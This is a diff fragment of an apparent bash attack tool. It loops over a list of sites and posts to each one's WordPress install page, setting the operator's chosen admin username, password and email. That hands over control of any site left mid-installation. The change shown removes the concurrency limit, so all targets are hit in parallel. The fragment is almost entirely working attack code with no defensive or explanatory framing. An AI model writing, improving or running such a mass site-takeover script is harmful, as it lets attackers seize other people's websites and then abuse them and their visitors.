@@ -7,7 +7,6 @@ white='\e[39m'
 COOKIE=cookie-`date +%s`
 COOKIE_PATH="/tmp/$COOKIE"
 USER_AGENT="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:21.0) Gecko/20130331 Firefox/21.0"
-THREAD=10
 ekse(){
 	if [[ $(curl --silent -d "weblog_title=RintoD&user_name=$user&admin_password=$pass&admin_password2=$pass&admin_email=$email&Submit=Install+Wordpress" --url "$site/wp-admin/install.php?step=2") =~ '<h1>Success!</h1>' ]];
 	then
@@ -50,7 +49,5 @@ read -p "Email: " email
 read -p "File: " file
 for site in `cat $list`; 
 do
-	((cthread=cthread%THREAD)); ((cthread++==0)) && wait
 		ekse $site &
 done
-wait
